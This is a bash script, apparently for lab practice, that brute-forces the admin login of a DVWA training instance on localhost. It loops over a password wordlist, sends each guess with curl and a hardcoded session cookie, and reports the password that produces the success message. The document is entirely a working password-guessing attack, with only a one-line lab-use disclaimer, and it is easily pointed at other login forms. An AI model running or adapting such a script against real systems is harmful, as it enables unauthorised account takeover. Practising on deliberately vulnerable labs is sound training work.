#!/bin/bash
# =========================================
# DVWA Brute Force Script (Low Security)
# Author  : anggie wiyoto
# Target  : http://localhost/DVWA
# Module  : Brute Force
# Purpose : Educational / Lab Use Only
# =========================================

URL="http://localhost/DVWA/vulnerabilities/brute/"
USERNAME="admin"
WORDLIST="pass.txt"

# SESSION (update this!)
PHPSESSID="e67a9cbee28514f09002961f52a7d006"

SUCCESS_STRING="Welcome to the password protected area"

echo "[*] Starting DVWA brute force attack"
echo "[*] Target  : $URL"
echo "[*] User    : $USERNAME"
echo "[*] Wordlist: $WORDLIST"
echo "-------------------------------------"

while read -r PASSWORD; do
    echo "[*] Trying password: $PASSWORD"

    RESPONSE=$(curl -s -b "PHPSESSID=$PHPSESSID; security=low" \
    "$URL?username=$USERNAME&password=$PASSWORD&Login=Login")

    if echo "$RESPONSE" | grep -q "$SUCCESS_STRING"; then
        echo ""
        echo "[+] SUCCESS!"
        echo "[+] Username : $USERNAME"
        echo "[+] Password : $PASSWORD"
        exit 0
    fi
done < "$WORDLIST"

echo "[-] Password not found"
exit 1
